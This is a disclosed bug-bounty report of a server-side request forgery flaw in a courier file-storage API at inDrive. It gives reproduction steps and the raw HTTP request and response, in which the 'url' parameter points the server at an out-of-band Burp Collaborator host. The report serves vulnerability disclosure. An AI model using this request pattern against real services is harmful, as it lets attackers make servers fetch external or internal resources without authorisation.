# SSRF in https://couriers.indrive.com/api/file-storage

## Report Details
- **Report ID**: 2300358
- **URL**: https://hackerone.com/reports/2300358
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-12-31T13:31:17.102Z
- **Disclosed**: 2024-01-16T17:11:29.622Z

## Reporter
- **Username**: cypher-28
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: indrive

## Vulnerability Information
## Summary:
SSRF in  ` url ` parameter in https://couriers.indrive.com/api/file-storage

## Steps To Reproduce:

I will try to demonstrate it using burp collaborator 

  1. Request https://couriers.indrive.com/api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com  ( replace ` url ` value with your burp collaporator )

  1. Notice the contnet being displayed in the response and also the Interaction in your burp collaborator

* The Request 
```
GET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com HTTP/2
Host: couriers.indrive.com
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ar;q=0.8


```

* The Response 
```
HTTP/2 200 OK
Authorization: Bearer undefined
Content-Disposition: attachment; filename="file
Date: Sun, 31 Dec 2023 13:19:04 GMT
X-Envoy-Upstream-Service-Time: 678
Server: istio-envoy
X-Cache: Miss from cloudfront
Via: 1.1 33c6e91bdc193e34e8dcc80edc466018.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: MRS52-P2
X-Amz-Cf-Id: 9GuBZr1A03ZS0bEYUbDp80JZj8dNYCE4YoVUImLD5RU15dEM-vs5fQ==

<html><body>6zy5d1pwzab93qopx8jq2ezjigz</body></html>
```


## Supporting Material/References:

████
██████████
████████

## Note
If you request any website like for example ` www.google.com `,  ` https://couriers.indrive.com/api/file-storage?url=https://www.google.com `you will see its html content being displayed in the response 

## Impact

The ` url ` parameter doesn't sanitize The input properly  which can make the Attacker to request any website he wants

## Attachments
No attachments
